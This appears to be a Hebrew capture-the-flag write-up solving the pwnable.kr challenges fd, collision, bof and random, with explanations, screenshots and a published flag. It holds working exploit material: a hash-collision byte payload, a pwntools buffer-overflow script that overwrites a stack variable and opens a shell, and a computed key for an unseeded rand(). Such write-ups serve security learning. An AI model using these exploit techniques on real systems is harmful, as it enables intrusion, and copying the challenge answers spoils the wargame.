# pwnable.kr
## fd
### מה זה fd?

fd הוא קיצור של file descriptor.
<br/>
fd מתאר קובץ על ידי מספר חיובי שלם במערכת ההפעלה המתייחס לתיאור הקובץ
<br/>
למשל:
```bash
standard input (stdin)   is '0'
standard output (stdout) is '1'
standard error (stderr)  is '2'
```
<br/>

![Capture1](https://user-images.githubusercontent.com/67608539/144753581-4a7b1d05-2376-4fff-bc07-5398d6a407e8.PNG)
<br/><br/><br/><br/>


נעתיק את קוד ה 'ssh' לטרמינל של לינוקס, אני משתמש ב- 'ubuntu-20.04.3'
ומיד לאחר מכן את הסיסמא- 'guest' כפי שמצויין.

![Capture2](https://user-images.githubusercontent.com/67608539/144739990-ee683c1e-22fd-4d91-bca2-c34611f46f69.PNG)
<br/><br/><br/><br/>

פעולה ראשונה שנעשה היא לבדוק אילו קבצים נמצאים, נכתוב את הפקודה 'ls' על מנת לראות אילו ספריות וקבצים יש במיקום

![Capture3](https://user-images.githubusercontent.com/67608539/144740069-b1909b2c-b7f3-4f22-ac1e-006e64dcfc32.PNG)

<br/><br/><br/><br/>
ישנם שלושה קבצים, אחד מהם קובץ C.
המטרה שלנו להגיע ל 'flag' מסויים, 
ניתן לראות שיש קובץ 'flag' ננסה לראות מה יש בו באמצעות הפקודה 'cat' 
על מנת לראות את תוכנו של הקובץ
![Capture9](https://user-images.githubusercontent.com/67608539/144740230-027723f7-953c-4d1d-9fe3-896ceb65cef2.PNG)

```bash
cat: flag: permission denied 
```
אין לנו מספיק הרשאות כדי להיכנס לקובץ.
<br/><br/><br/><br/>

ננסה להריץ את הפקודה 'cat' על הקובץ 'fd.c'
![Capture4](https://user-images.githubusercontent.com/67608539/144740294-e9bb5014-e7b2-436d-bee1-efee4873d38f.PNG)

ניתן לראות שהתוכנית אמורה לקבל ארגומנט כלשהו, ננסה להריץ מספר ניסיונות.
```c
int main(int argc, char* argv[], char* envp[])
```
כאשר לא מזינים ארגומנט כלשהו, נקבל הודעה שאמור להיות ארגומנט.

![Capture5](https://user-images.githubusercontent.com/67608539/144743474-d17bbbcc-886f-4257-8ee4-aacd55a227ef.PNG)
```c
if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
        }
```

ננסה שנית אך הפעם נזין ארגומנט כלשהו

![Capture6](https://user-images.githubusercontent.com/67608539/144743499-c5ba09c1-913d-4d32-9ee9-f0b84250bd0c.PNG)

ניתן לראות שאנחנו מקבלים הודעה שונה מהקודמת.

נסתכל על השורה הזאת בקוד-
```bash
int fd = atoi( argv[1] ) - 0x1234;
```

 נמיר את '0x1234' למספר דצימלי.
 נקבל את המספר 4660.
 נשים כארגומנט את המספר 4660 כך שפעולת החיסור תיתן לנו-0.
 ```bash
 fd = 0; 
 ```
 
 ניתן לראות שבניגוד לניסיונות הקדומים, כאן אנו מקבלים אופציה לקלט 
 ![Capture7](https://user-images.githubusercontent.com/67608539/144743866-4a3408b4-4db3-4c46-933a-7f766575327a.PNG)
 
 ננסה להזין את המילה שמושוואת בתנאי- '"LETMEWIN"'
![Capture8](https://user-images.githubusercontent.com/67608539/144743874-1c2d02e7-bb97-494a-8d94-df4b9aea573a.PNG)


הגענו לפיתרון!
 ```bash
flag- “ mommy! I think I know what a file descriptor is!! ”
```



---

<br/><br/>
חשוב להבין מקטע הקוד מה הם הפונקציות- read ו system

```bash
read() attempts to read up to count bytes from file descriptor fd
into the buffer starting at buf.
```
[להמשך קריאה-read](https://man7.org/linux/man-pages/man2/read.2.html)

```bash
system() used to pass the commands that can be executed in the command processor
or the terminal of the operating system
```
[להמשך קריאה-system](https://man7.org/linux/man-pages/man3/system.3.html)

<br/><br/><br/><br/><br/><br/><br/>
## collison
<br/><br/>
```bash
0x21DD09EC -> 568134124
4*5= 20; 20 bytes, 5 of 4 bytes.
568134124/4 = ~113626824
568134124- (113626824*4) = 113626828

dec-
113626824  113626824  113626824  113626824  113626828

hex-
0x6C5CEC8 0x6C5CEC8 0x6C5CEC8 0x6C5CEC8 0x6C5CECC

`python -c 'print ("\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06")'`
```

<br/><br/><br/><br/><br/><br/><br/>
## bof
<br/><br/>

```python 
from pwn import *

shell = remote("pwnable.kr", 9000)
text = 'A' * 52 + '\xbe\xba\xfe\xca'

shell.sendline(text)
shell.interactive()

#ignore - BytesWarning
#type ls
#see flag
# type cat flag
```

## random

```c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}
```
<br/><br/>
אין ``seed`` כלומר הערך אינו משתנה
<br/>
``0xdeadbeef = 3735928559``
<br />
``key ^ random = 3735928559``
<br/>
נריץ את הפונ ונדפיס את הערך של random 
``random = 1804289383``
<br /><br />
``key ^ 1804289383 = 3735928559 ``
<br />
``3735928559 ^ 1804289383 = key ``
<br /><br />
``key = 3039230856``


